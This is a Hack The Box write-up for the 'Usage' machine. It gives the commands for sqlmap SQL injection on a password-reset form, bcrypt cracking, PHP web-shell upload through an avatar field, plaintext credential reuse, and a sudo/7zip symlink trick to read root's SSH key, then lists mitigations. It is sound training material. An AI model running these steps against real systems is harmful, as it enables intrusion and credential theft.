# Usage - Ashbo3n

**Machine Name:** Usage

**Platform:** HTB

**Area Of Interest:** <span class="chip__text htb-body-md htb-text-primary htb-font-medium">SQL Injection, </span><span class="chip__text htb-body-md htb-text-primary htb-font-medium">Arbitrary File Read, </span><span class="chip__text htb-body-md htb-text-primary htb-font-medium">Weak Credentials, </span><span class="chip__text htb-body-md htb-text-primary htb-font-medium">Remote Code Execution, </span><span class="chip__text htb-body-md htb-text-primary htb-font-medium">Clear Text Credentials, </span><span class="chip__text htb-body-md htb-text-primary htb-font-medium">Arbitrary File Upload, </span><span class="chip__text htb-body-md htb-text-primary htb-font-medium">Misconfiguration, </span><span class="chip__text htb-body-md htb-text-primary htb-font-medium">Insecure Design</span>

### Initial Shell - Sql Injection

We will start with nmap, we are using nmap to know the 'open' ports and services running on the **target** as well as services names, services version's, running nmap's default list on the target and lastly what OS is being used, we will use the command:

```bash
nmap $IP -sVC -p- -vv --min-rate=5000 -oN nmap
```

**Nmap Output:**

```bash
Increasing send delay for 10.129.37.219 from 10 to 20 due to 569 out of 1895 dropped probes since last increase.
Nmap scan report for 10.129.37.219
Host is up, received echo-reply ttl 63 (0.25s latency).
Scanned at 2026-01-14 21:47:14 IST for 34s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFfdLKVCM7tItpTAWFFy6gTlaOXOkNbeGIN9+NQMn89HkDBG3W3XDQDyM5JAYDlvDpngF58j/WrZkZw0rS6YqS0=
|   256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHr8ATPpxGtqlj8B7z2Lh7GrZVTSsLb6MkU3laICZlTk
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 14 21:47:48 2026 -- 1 IP address (1 host up) scanned in 34.33 seconds
```

We will now put `usage.htb` into `/etc/hosts`, we can do that in several ways, if you are on a root shell in your attacker machine you can use `echo '[Target's IP] [Domain name]' >> /etc/hosts` or you can use `echo "192.168.1.10 target.local" | sudo tee -a /etc/hosts` note: Running the first command as standard user will fail, no matter even if you use sudo before echo because of shell redirection, Why do we need to put this into /etc/hosts? Because there is no DNS, our browser will search our /etc/hosts for the hostname and the IP which we just added into our /etc/hosts

### Enumeration

**Whatweb**

whatweb is a CLI tool that guesses which services and there version could be running on the target server.

```bash
http://usage.htb/ [200 OK] Bootstrap[4.1.3], Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[laravel_session], IP[10.129.37.219], Laravel, PasswordField[password], Title[Daily Blogs], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block], nginx[1.18.0]
```

**FFUF**

We will run FFUF for directory and VHOST fuzzing, FFUF (Fuzz faster you fool) is a tool used to discover hidden files, directories, virtual hosts and etc, in our case, i am using it to find hidden directories and Vhosts, I am using bitquark-subdomains-top100000.txt and directory-list-2.3-medium.txt from seclists, note: I have merged common.txt and quickhits.txt from seclists into directory-list-2.3-medium.txt

#### Vhost Fuzzing

**Command Used:**

```bash
ffuf -c -u http://usage.htb/ -w ~/wordlist/bitquark-subdomains-top100000.txt -H 'Host: FUZZ.usage.htb' -t 60 -ic -fs 178
```

<details id="bkmrk-explanation-of-comma"><summary>Explanation of Command</summary>

-c because i want colored output, -u for URL, -w to specify wordlist, -H to tell header, -t to specify how many threads, -ic to ignore comments (If any in the wordlists) -fs to filter by size

</details>**Output**

```bash
admin                   [Status: 200, Size: 3304, Words: 493, Lines: 89, Duration: 304ms]
```

Add admin.usage.htb into our /etc/hosts file.

#### Directory Fuzzing

We will now fuzz and find directories for both usage.htb and admin.usage.htb with ffuf.

**Command Used**

```bash
ffuf -c -u http://usage.htb/FUZZ -w ~/wordlist/directory-list-2.3-medium.txt -t 60 -ic -fc 403
```

<details id="bkmrk-explanation-of-comma-1"><summary>Explanation of Command</summary>

-c for colored output, -u for url, -w for wordlist, -t for threads, -ic to ignore comments, -fc to filter status code 403

</details>**Output:**

```bash
login                   [Status: 200, Size: 5141, Words: 2184, Lines: 266, Duration: 308ms]
robots.txt              [Status: 200, Size: 24, Words: 2, Lines: 3, Duration: 315ms]
login                   [Status: 200, Size: 5141, Words: 2184, Lines: 266, Duration: 383ms]
```

And

```bash
ffuf -c -u http://admin.usage.htb/FUZZ -w ~/wordlist/directory-list-2.3-medium.txt -t 60 -ic -fc 403
```

command is same as above just changed the URL, This 2nd command didn't return any directories as of now, will come to it later onces it finished (If needed)

#### Website Enumeration

Going to [http://usage.htb/forget-password](http://usage.htb/forget-password) and entering a single quote return an error confirming a SQLi Vulnerability

#### Exploitation

Now our goal is to dump the DB to our attacker machine, a tool we can utilize is SQLMAP, SQLMAP automates the detection and exploitation of **SQL injection (SQLi)** vulnerabilities and makes it more efficient to exploit, to use SQLMAP we first need to intercept the POST request of forget-password via burp or any other tool of your preference, After intercepting the request save that request to a file name can be anything, i am entering Req.req, And the command and command syntax for sqlmap is:

```bash
sqlmap -r Req.req -p email --level=5 --risk=3 --technique=B --batch --dbs --threads 10
```

<details id="bkmrk-explanation-of-comma-2"><summary>Explanation of Command</summary>

-r to load HTTP Request, -p for target Parameter in the request, --level for Test Dept, --risk=3 for aggressiveness, --technique to select Boolean-based, --batch so SQLMAP makes decisions automatically and does not asks us, --dbs to enumerate Database, --threads to tell threads

</details>**Output**

```bash
[23:06:07] [INFO] retrieved: usage_blog             
available databases [3]:
[*] information_schema
[*] performance_schema
[*] usage_blog

```

Then run this command:

```bash
sqlmap -r Req.req -p email --level=5 --risk=3 --technique=B --batch -D usage_blog --tables --threads 10
```

This command fetches the tables from the Discovered DB:

```bash
[15 tables]
+------------------------+
| admin_menu             |
| admin_operation_log    |
| admin_permissions      |
| admin_role_menu        |
| admin_role_permissions |
| admin_role_users       |
| admin_roles            |
| admin_user_permissions |
| admin_users            |
| blog                   |
| failed_jobs            |
| migrations             |
| password_reset_tokens  |
| personal_access_tokens |
| users                  |
+------------------------+
```

Then run this command:

```bash
sqlmap -r Req.req -p email --level=5 --risk=3 --technique=B --batch -D usage_blog -T users -T "admin_users" --dump --threads 10
```

The command is same as before just added -T admin\_users to get hashes from those table

**Output**

```bash
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| id | name          | avatar  | password                                                     | username | created_at          | updated_at          | remember_token                                               |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+

```

lets crack the hashes!

##### Hash Cracking

First put the hash into a .txt file, name could be anything really but hash.txt or hashes.txt is prefered for readability, after that we can use this command:

```bash
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

<details id="bkmrk-explanation-of-comma-3"><summary>Explanation of Command</summary>

-m for mode, since this is a Bcrypt hash we will use 3200, -a for Attack Mode which is set to 0, hash.txt is the .txt file where hash is stored and lastly its the path to rockyou.txt

</details>After hashcat cracks the hash, we can go to [http://admin.usage.htb/](http://admin.usage.htb/) and login as admin:Reacted, after log in it redirected us to [http://admin.usage.htb/admin](http://admin.usage.htb/admin) which is a dashboard type

#### Getting a Reverse Shell

Now we can go to [http://admin.usage.htb/admin/auth/users](http://admin.usage.htb/admin/auth/users) and click on 3 dots then actions and click on edit then change the name from administrator to anything you like however intercept that name change request in burp, and change `Content-Disposition: form-data; name="avatar"; filename=""` to `Content-Disposition: form-data; name="avatar"; filename="webshell.php"` and below it you can reverse shell payload, i used pentest monkey reverse shell, if you try to add the file itself it will reject it but we can edit it as i showed above, you can just below it and you should get a reverse shell.

At first i tried to get a webshell and tried to convert it to a reverse shell but for some reasons application kept removing my webshell so in the end i gave up on that one and moved to above method and got a reverse shell.

Now you can just get the flag.

```
dash@usage:/$ cd ~/
dash@usage:~$ ls
user.txt
dash@usage:~$ cat user.txt
Redacted
dash@usage:~$ 

```

### Root shell - Sudo Misconfiguration

We can go to user home dir and do ls -la and we can see a file named: .monitrc and after viewing it we can find a plain text password in it: Redacted

Now to get the username we can view the /etc/passwd file and find a user named xander in it:

```
xander:x:1001:1001::/home/xander:/bin/bash
```

Now we can ssh in the machine, after ssh use this command:

```
touch @id_rsa
```

It's basically creating a id\_rsa we are adding @ because it tells 7zip that its gonna print the file

now create a link to /root/.ssh/.id\_rsa to id\_rsa with this command:

```bash
ln -s /root/.ssh/id_rsa id_rsa
```

and lastly move these files to /var/www/html and run it via sudo /usr/bin/usage\_management and choose option 1 and you should get the id\_rsa file. Now Log in and get the root flag:

```bash
┌──(root㉿kali)-[~/HTB/Usage/id_rsa]
└─# ssh -i id_rsa root@10.129.37.219 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Wed Jan 14 08:08:21 PM UTC 2026

  System load:           0.02099609375
  Usage of /:            66.9% of 6.53GB
  Memory usage:          22%
  Swap usage:            0%
  Processes:             236
  Users logged in:       1
  IPv4 address for eth0: 10.129.37.219
  IPv6 address for eth0: dead:beef::250:56ff:feb0:c117


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Apr  8 13:17:47 2024 from 10.10.14.40
root@usage:~# cat /root/root.txt
Redacted!
root@usage:~#
```

### Mitigations

To secure the environment against the attack vectors described in the writeup, the following security controls should be implemented:

1. <span data-path-to-node="3,0,1,0">**<span class="citation-62">Sanitize User Input (SQL Injection):</span>**<span class="citation-62"> Implement prepared statements and parameterized queries for all database interactions, particularly on forms like the password reset page</span></span><span data-path-to-node="3,0,1,1"><span class="citation-62 citation-end-62"><sup class="superscript" data-turn-source-index="1"></sup><sup class="superscript" data-turn-source-index="1"></sup></span></span><span data-path-to-node="3,0,1,2">.</span>
2. <span data-path-to-node="3,0,1,2"><span data-path-to-node="3,1,1,0">**<span class="citation-61">Enforce Strong Password Policies:</span>**<span class="citation-61"> Require complex passwords and use robust hashing algorithms (like Bcrypt with a high cost factor) to prevent successful offline cracking via tools like </span>`<span class="citation-61">hashcat</span>`</span><span data-path-to-node="3,1,1,1"><span class="citation-61 citation-end-61"><sup class="superscript" data-turn-source-index="2"></sup><sup class="superscript" data-turn-source-index="2"></sup></span></span><span data-path-to-node="3,1,1,2">.</span></span>
3. <span data-path-to-node="3,0,1,2"><span data-path-to-node="3,1,1,2"><span data-path-to-node="3,2,0,0">**Secure File Upload Functionality:** Implement strict server-side validation for file uploads. </span><span data-path-to-node="3,2,0,2"><span class="citation-60">This includes verifying file extensions, MIME types, and file content (magic bytes)</span></span><span data-path-to-node="3,2,0,3"><span class="citation-60 citation-end-60"><sup class="superscript" data-turn-source-index="3"></sup></span></span><span data-path-to-node="3,2,0,4">. </span><span data-path-to-node="3,2,0,6"><span class="citation-59">Rename uploaded files and store them in a non-web-accessible directory with execution permissions disabled</span></span><span data-path-to-node="3,2,0,7"><span class="citation-59 citation-end-59"><sup class="superscript" data-turn-source-index="4"></sup></span></span><span data-path-to-node="3,2,0,8">.</span></span></span>
4. <span data-path-to-node="3,0,1,2"><span data-path-to-node="3,1,1,2"><span data-path-to-node="3,2,0,8"><span data-path-to-node="3,3,1,0">**<span class="citation-58">Secure Credential Storage:</span>**<span class="citation-58"> Never store sensitive information like passwords in plain text within configuration files (e.g., </span>`<span class="citation-58">monitrc</span>`<span class="citation-58">)</span></span><span data-path-to-node="3,3,1,1"><span class="citation-58 citation-end-58"><sup class="superscript" data-turn-source-index="5"></sup></span></span><span data-path-to-node="3,3,1,2">. </span><span data-path-to-node="3,3,1,4"><span class="citation-57">Use secure secrets management solutions or environment variables with restricted access</span></span><span data-path-to-node="3,3,1,5"><span class="citation-57 citation-end-57"><sup class="superscript" data-turn-source-index="6"></sup></span></span><span data-path-to-node="3,3,1,6">.</span></span></span></span>
5. <span data-path-to-node="3,0,1,2"><span data-path-to-node="3,1,1,2"><span data-path-to-node="3,2,0,8"><span data-path-to-node="3,3,1,6"><span data-path-to-node="3,4,1,0">**<span class="citation-56">Principle of Least Privilege:</span>**<span class="citation-56"> Ensure that system binaries (e.g., </span>`<span class="citation-56">usage_management</span>`<span class="citation-56">) do not have over-privileged </span>`<span class="citation-56">sudo</span>`<span class="citation-56"> permissions that allow arbitrary file reading or symlink exploitation.</span></span><span data-path-to-node="3,4,1,1"><span class="citation-56 citation-end-56"><sup class="superscript" data-turn-source-index="7"></sup><sup class="superscript" data-turn-source-index="7"></sup><sup class="superscript" data-turn-source-index="7"></sup></span></span></span></span></span></span>
6. <span data-path-to-node="3,0,1,2"><span data-path-to-node="3,1,1,2"><span data-path-to-node="3,2,0,8"><span data-path-to-node="3,3,1,6"><span data-path-to-node="3,4,1,0"><span class="citation-56"><span data-path-to-node="3,5,1,0">**<span class="citation-55">Restrict SSH Key Access:</span>**<span class="citation-55"> Protect sensitive SSH keys by ensuring the </span>`<span class="citation-55">.ssh</span>`<span class="citation-55"> directory and its contents have restricted permissions (e.g., </span>`<span class="citation-55">600</span>`<span class="citation-55"> for private keys) and are not accessible by lower-privileged users</span></span><span data-path-to-node="3,5,1,1"><span class="citation-55 citation-end-55"><sup class="superscript" data-turn-source-index="8"></sup><sup class="superscript" data-turn-source-index="8"></sup><sup class="superscript" data-turn-source-index="8"></sup><sup class="superscript" data-turn-source-index="8"></sup></span></span><span data-path-to-node="3,5,1,2">.</span></span></span></span></span></span></span>

#### <span data-path-to-node="3,0,1,2"><span data-path-to-node="3,1,1,2"><span data-path-to-node="3,2,0,8"><span data-path-to-node="3,3,1,6"><span data-path-to-node="3,4,1,0"><span class="citation-56"><span data-path-to-node="3,5,1,2">Summary of Mitigations</span></span></span></span></span></span></span>

<table border="1" id="bkmrk-vulnerability-root-c" style="border-collapse: collapse; width: 100%;"><colgroup><col style="width: 33.3333%;"></col><col style="width: 33.3333%;"></col><col style="width: 33.3333%;"></col></colgroup><tbody><tr><td>**<span data-path-to-node="6,0,0,0">Vulnerability</span>**</td><td>**<span data-path-to-node="6,0,1,0">Root Cause</span>**</td><td>**<span data-path-to-node="6,0,2,0">Recommended Mitigation</span>**</td></tr><tr><td><span data-path-to-node="6,1,0,0">**SQL Injection**</span></td><td><span data-path-to-node="6,1,1,0,1"><span class="citation-54">Lack of input sanitization on the </span>`<span class="citation-54">forget-password</span>`<span class="citation-54"> page</span></span><span data-path-to-node="6,1,1,0,2"><span class="citation-54 citation-end-54"><sup class="superscript" data-turn-source-index="9"></sup></span></span><span data-path-to-node="6,1,1,0,3">.</span></td><td><span data-path-to-node="6,1,2,0,1"><span class="citation-53">Use prepared statements and parameterized queries</span></span><span data-path-to-node="6,1,2,0,2"><span class="citation-53 citation-end-53"><sup class="superscript" data-turn-source-index="10"></sup></span></span><span data-path-to-node="6,1,2,0,3">.</span></td></tr><tr><td>**Weak Authentication**</td><td><span data-path-to-node="6,2,1,0,1"><span class="citation-52">Use of crackable Bcrypt hashes</span></span><span data-path-to-node="6,2,1,0,2"><span class="citation-52 citation-end-52"><sup class="superscript" data-turn-source-index="11"></sup></span></span><span data-path-to-node="6,2,1,0,3">.</span></td><td><span data-path-to-node="6,2,2,0,1"><span class="citation-51">Enforce high-entropy password requirements</span></span><span data-path-to-node="6,2,2,0,2"><span class="citation-51 citation-end-51"><sup class="superscript" data-turn-source-index="12"></sup></span></span></td></tr><tr><td><span data-path-to-node="6,3,0,0">**Arbitrary File Upload**</span></td><td><span data-path-to-node="6,3,1,0,1"><span class="citation-50">Insecure processing of the </span>`<span class="citation-50">avatar</span>`<span class="citation-50"> parameter in user profiles</span></span><span data-path-to-node="6,3,1,0,2"><span class="citation-50 citation-end-50"><sup class="superscript" data-turn-source-index="13"></sup></span></span><span data-path-to-node="6,3,1,0,3">.</span></td><td><span data-path-to-node="6,3,2,0,1"><span class="citation-49">Implement strict file validation and disable script execution in upload directories</span></span><span data-path-to-node="6,3,2,0,2"><span class="citation-49 citation-end-49"><sup class="superscript" data-turn-source-index="14"></sup></span></span><span data-path-to-node="6,3,2,0,3">.</span></td></tr><tr><td>**Clear Text Credentials**</td><td><span data-path-to-node="6,4,1,0,1"><span class="citation-48">Plain text password stored in </span>`<span class="citation-48">monitrc</span>`<span class="citation-48"> file</span></span><span data-path-to-node="6,4,1,0,2"><span class="citation-48 citation-end-48"><sup class="superscript" data-turn-source-index="15"></sup></span></span><span data-path-to-node="6,4,1,0,3">.</span></td><td><span data-path-to-node="6,4,2,0,1"><span class="citation-47">Use a secure vault or encrypted configuration management</span></span><span data-path-to-node="6,4,2,0,2"><span class="citation-47 citation-end-47"><sup class="superscript" data-turn-source-index="16"></sup></span></span><span data-path-to-node="6,4,2,0,3">.</span></td></tr><tr><td>**Privilege Escalation**</td><td><span data-path-to-node="6,5,1,1,0">`<span class="citation-46">sudo</span>`<span class="citation-46"> binary allowing symlink exploitation to read root files</span></span><span data-path-to-node="6,5,1,1,1"><span class="citation-46 citation-end-46"><sup class="superscript" data-turn-source-index="17"></sup><sup class="superscript" data-turn-source-index="17"></sup><sup class="superscript" data-turn-source-index="17"></sup></span></span><span data-path-to-node="6,5,1,1,2">.</span></td><td><span data-path-to-node="6,5,2,0,1"><span class="citation-45">Restrict </span>`<span class="citation-45">sudo</span>`<span class="citation-45"> rights and validate input/paths within custom management scripts</span></span><span data-path-to-node="6,5,2,0,2"><span class="citation-45 citation-end-45"><sup class="superscript" data-turn-source-index="18"></sup></span></span><span data-path-to-node="6,5,2,0,3">.</span></td></tr></tbody></table>